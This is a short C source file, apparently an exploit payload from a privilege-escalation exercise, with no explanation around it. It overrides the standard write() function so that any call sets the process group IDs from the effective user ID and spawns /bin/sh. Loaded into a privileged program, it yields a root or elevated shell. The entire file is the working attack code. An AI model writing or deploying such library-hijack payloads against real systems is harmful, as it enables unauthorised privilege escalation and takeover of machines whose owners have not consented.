#define _GNU_SOURCE

#include <unistd.h>
#include <sys/types.h>


ssize_t write(int fd, const void *buf, size_t count);


ssize_t write(int fd, const void *buf, size_t count){

	uid_t id;
	
	id = geteuid();
	setresgid(id, id, id);	
	execve("/bin/sh", NULL, NULL);

	return(count);
}
